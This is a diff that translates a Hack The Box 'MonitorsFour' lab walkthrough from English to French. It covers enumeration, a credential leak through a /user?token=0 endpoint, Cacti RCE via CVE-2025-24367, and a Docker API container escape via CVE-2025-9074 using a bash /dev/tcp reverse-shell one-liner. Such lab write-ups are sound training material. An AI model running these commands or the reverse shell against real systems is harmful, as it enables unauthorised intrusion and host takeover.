@@ -15,13 +15,19 @@ type: "post"
 * OS: Windows
 ---
 
+MonitorsFour débute par l’énumération d’une application web et la découverte d’un endpoint vulnérable permettant la divulgation d’informations utilisateurs. Les identifiants récupérés donnent accès à l’interface principale ainsi qu’à une instance de Cacti utilisée pour la supervision réseau.
+
+L’analyse de l’instance Cacti met en évidence la vulnérabilité `CVE-2025-24367`, permettant l’exécution de code à distance. Son exploitation conduit à l’obtention d’un accès initial au système au sein d’un conteneur Docker hébergé sur une machine Windows.
+
+L'énumération de la cible permet ensuite d’identifier une API Docker exposée sans authentification. L’analyse de l’environnement Docker révèle la vulnérabilité `CVE-2025-9074`, permettant l’exécution de commandes privilégiées sur l’hôte via l’API Docker Engine. L’exploitation de cette faille conduit finalement à une évasion du conteneur et à la compromission complète du système Windows sous-jacent.
+
 # Balayage
 
 ```
 nmap -p- --open -T4 -sCV -oA nmap/MonitorsFour {TARGET_IP}
 ```
 
-**Results**
+**Résultats**
 
 ```shell
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-20 07:57 EDT
@@ -42,22 +48,22 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 177.01 seconds
 ```
 
-Nmap finds two open ports:
-- 80 (http) with a nginx web server, and a redirection to `monitorsfour.htb`
+Nmap détecte deux ports ouverts :
+- 80 (HTTP) avec un serveur web Nginx, et une redirection vers `monitorsfour.htb`
 
 ```
 sudo echo "{IP} monitorsfour.htb" | sudo tee -a /etc/hosts
 ```
 
-- 5985 which is the default port for WinRM
+- 5985, qui est le port par défaut pour WinRM
 
-# Enumeration
+# Énumération
 
-Visiting `http://monitorsfour.htb/` we find a website for a network monitoring solution.
+En se rendant sur `http://monitorsfour.htb/`, nous découvrons le site web d'une solution de surveillance de réseau.
 
 ![MonitorsFour website](/images/HTB-MonitorsFour/monitorsfour_web.png)
 
-The web application does not present any exploitable paths so we move on to directory enumeration.
+L'application web ne présente aucune vulnérabilité exploitable; nous passons donc à l'énumération des répertoires.
 
 ```
 gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://monitorsfour.htb
@@ -65,13 +71,11 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://m
 
 ![MonitorsFour website](/images/HTB-MonitorsFour/monitors4_gobuster.png)
 
-A directory named `/.env` is discovered. We access it at `http://monitorsfour.htb/.env`.
+Un répertoire nommé `/.env` est découvert. On y accède à l'adresse `http://monitorsfour.htb/.env`.
 
 ![MonitorsFour env](/images/HTB-MonitorsFour/monitors4_env.png)
 
-A file is downloaded. It contains database credentials however we are not able to use it currently.
-
-Next is subdomain enumeration.
+Un fichier est téléchargé. Il contient les identifiants de la base de données, mais nous ne pouvons pas l'utiliser pour le moment. Nous passons ensuite à l'énumération des sous-domaines.
 
 ```
 ffuf -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 100 -u http://monitorsfour.htb -H "Host: FUZZ.monitorsfour.htb" -ic -fs 138
@@ -79,15 +83,15 @@ ffuf -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -
 
 ![MonitorsFour subdomain enumeration](/images/HTB-MonitorsFour/monitors4_ffuf.png)
 
-At `http://cacti.monitorsfour.htb` we find an instance of [cacti](https://www.cacti.net/) with version `1.2.28`.
+À l'adresse `http://cacti.monitorsfour.htb`, nous trouvons une instance de [cacti](https://www.cacti.net/) avec la version `1.2.28`.
 
 ![MonitorsFour cacti version](/images/HTB-MonitorsFour/cacti_version.png)
 
-Credentials are needed to login, we return to the main website and take a look at the additional endpoints. `/user` seems interesting, trying to access it leads to an error because of a missing `token` parameter.
+Des identifiants sont nécessaires pour se connecter ; nous retournons sur le site principal et examinons les autres points de terminaison. `/user` semble intéressant, mais toute tentative d'accès aboutit à une erreur en raison de l'absence du paramètre `token`.
 
 ![MonitorsFour user directory](/images/HTB-MonitorsFour/monitors4_user.png)
 
-We test the logic and both random value and empty token fail.
+Nous testons la logique, et les valeurs aléatoires ainsi que les jetons vides échouent.
 
 ```
 curl "http://monitorsfour.htb/user?token=AAAA"
@@ -97,7 +101,7 @@ curl "http://monitorsfour.htb/user?token="
 
 ![token tests](/images/HTB-MonitorsFour/token_tests.png)
 
-Further testing reveals `0` as a valid value for `token`
+En effectuant un fuzzing, on constate que `0` est une valeur valide pour `token`.
 
 ```
 ffuf -u 'http://monitorsfour.htb/user?token=FUZZ' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac
@@ -105,7 +109,7 @@ ffuf -u 'http://monitorsfour.htb/user?token=FUZZ' -w /usr/share/seclists/Fuzzing
 
 ![user endpoint fuzing](/images/HTB-MonitorsFour/user-fuzz.png)
 
-Sending a request returns user credentials.
+L'envoi d'une requête valide renvoie les identifiants des utilisateurs.
 
 ```
 curl "http://monitorsfour.htb/user?token=0
@@ -168,27 +172,27 @@ curl "http://monitorsfour.htb/user?token=0
 ]
 ```
 
-The admin password is recovered: `wonderful1`.
+Le mot de passe `wonderful1` est récupéré pour l'utilisateur `admin`.
 
 ![marcus password](/images/HTB-MonitorsFour/marcus_pwd.png)
 
-Using `admin:wonderful1` we login into the main website and access the dashboard.
+En utilisant les identifiants `admin:wonderful1`, nous nous connectons au site web principal et accédons au tableau de bord.
 
 ![MonitorsFour dashboard](/images/HTB-MonitorsFour/monitorsfour_dashboard.png)
 
-The same credentials do not work on the cacti instance, but `marcus:wonderful1` work.
+Ces identifiants ne fonctionnent pas sur l'instance Cacti, mais `marcus:wonderful1` sont acceptés.
 
 ![cacti login](/images/HTB-MonitorsFour/cacti_monitors4.png)
 
-We access the dashboard.
+Nous accédons au tableau de bord.
 
 ![cacti dashboard](/images/HTB-MonitorsFour/cacti_dashboard.png)
 
-# Initial Foothold
+# Accès Initial
 
-Poking around the dashboard does not reveal anything exploitatble. Searching for cacti vulnerabilities leads to `CVE-2025-24367` with a PoC available [here](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC).
+En explorant le tableau de bord, rien d'exploitable n'apparaît. Une recherche sur les vulnérabilités de Cacti mène à `CVE-2025-24367`, pour laquelle un PoC est disponible [here](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC).
 
-**Environment Prep**
+**Préparation de l'environnement**
 
 ```
 git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git
@@ -200,7 +204,7 @@ python3 -m venv myvenv
 source myvenv/bin/activate
 ```
 
-**Vulnerability Exploitation**
+**Exploitation de la vulnérabilité**
 
 ```
 sudo python3 exploit.py -url http://cacti.monitorsfour.htb -u marcus -p wonderful1 -i <ATTACKER_IP> -l <LISTERNER_PORT>
@@ -210,21 +214,19 @@ sudo python3 exploit.py -url http://cacti.monitorsfour.htb -u marcus -p wonderfu
 
 ![MonitorsFour foothold](/images/HTB-MonitorsFour/foothold.png)
 
-The hostname is noteworthy, this is a typical container ID. The target is a Windows machine but we are currently in a Linux container, the user flag is in `/home/marcus`.
+Le nom d'hôte attire l'attention: il s'agit d'un identifiant de conteneur classique. La cible est une machine Windows, mais nous nous trouvons actuellement dans un conteneur Linux ; le drapeau utilisateur se trouve dans `/home/marcus`.
 
 ![user flag location](/images/HTB-MonitorsFour/MonitorsFour_userflag.png)
 
-# Privilege Escalation
+# Élévation des privilèges
 
-We need to escape the container and to access the host system.
-
-Let's collect some network information
+Nous devons sortir du conteneur pour accéder au système hôte. Nous commençons par recueillir quelques informations réseau.
 
 ![network data](/images/HTB-MonitorsFour/network_data.png)
 
-`172.18.0.1` is the Docker bridge gateway / host-side Docker interface and `192.168.65.7` is the upstream DNS or external host reachable from Docker.
+`172.18.0.1` correspond à la passerelle du pont Docker / l'interface Docker côté hôte, tandis que `192.168.65.7` désigne le serveur DNS en amont ou l'hôte externe accessible depuis Docker.
 
-A common escape technique is abusing the API so let's check it.
+Une technique d'échappement courante consiste à exploiter l'API ; vérifions ce point.
 
 ```
 curl http://192.168.65.7:2375/version
@@ -232,9 +234,9 @@ curl http://192.168.65.7:2375/version
 
 ![Docker API version](/images/HTB-MonitorsFour/Docker_API_version.png)
 
-Enumeration of the Docker networking configuration revealed an exposed Docker Remote API accessible at `192.168.65.7:2375`. Querying the `/version` endpoint confirmed unauthenticated access to the Docker daemon. The response identified the environment as Docker Engine Community running on a WSL2-backed Linux kernel (`6.6.87.2-microsoft-standard-WSL2`).
+L'analyse de la configuration réseau de Docker a révélé une API Docker Remote exposée, accessible à l'adresse `192.168.65.7:2375`. Une requête sur le point de terminaison `/version` a confirme l'accès sans authentification au daemon Docker. La réponse identifie l'environnement comme étant Docker Engine Community, fonctionnant sur un noyau Linux basé sur WSL2 (`6.6.87.2-microsoft-standard-WSL2`).
 
-We enumerate the Docker images
+Nous énumérons les images Docker.
 
 ```
 curl -s http://192.168.65.7:2375/images/json | grep -o '"RepoTags":\[[^]]*\]'
@@ -242,9 +244,9 @@ curl -s http://192.168.65.7:2375/images/json | grep -o '"RepoTags":\[[^]]*\]'
 
 ![Docker images enumeration](/images/HTB-MonitorsFour/docker_enum.png)
 
-There are three Docker images available on the Docker host. Through research we find that `version 28.3.2` (found after querrying `/version`) correspond to Docker Desktop 4.43.x or newer. Searching for `Docker Desktop 4.43.x cve` we find `CVE-2025-9074`, a vulnerability allowing local containers to execute privileged commands on the host via the Docker Engine API. 
+Trois images Docker sont disponibles sur l'hôte Docker. Après vérification, nous constatons que la `version 28.3.2` (obtenue en interrogeant `/version` ) correspond à Docker Desktop 4.43.x ou une version plus récente. En recherchant "Docker Desktop 4.43.x cve", nous trouvons `CVE-2025-9074`, une vulnérabilité permettant aux conteneurs locaux d'exécuter des commandes privilégiées sur l'hôte via l'API Docker Engine. 
 
-A PoC is available [here](https://github.com/BridgerAlderson/CVE-2025-9074-PoC). The command below will create a new container  
+Un PoC est disponible [ici](https://github.com/BridgerAlderson/CVE-2025-9074-PoC). La commande ci-dessous permet de créer un nouveau conteneur.  
 
 ```
 ./cve-2025-9074.sh 192.168.65.7 'bash -c "bash -i >& /dev/tcp/10.10.14.48/9001 0>&1"' 2375
@@ -252,7 +254,7 @@ A PoC is available [here](https://github.com/BridgerAlderson/CVE-2025-9074-PoC).
 
 ![RCE cve_2025_9074](/images/HTB-MonitorsFour/rce_cve_2025_9074.png)
 
-A shell is created on the listener and we can read the root flag at `/host_root/mnt/host/c/Users/Administrator/Desktop/root.txt`.
+Un shell est créé sur le listener et nous pouvons lire le drapeau root à l'emplacement `/host_root/mnt/host/c/Users/Administrator/Desktop/root.txt`.
 
 ![Root flag location](/images/HTB-MonitorsFour/MonitorsFour_rootflag.png)
 
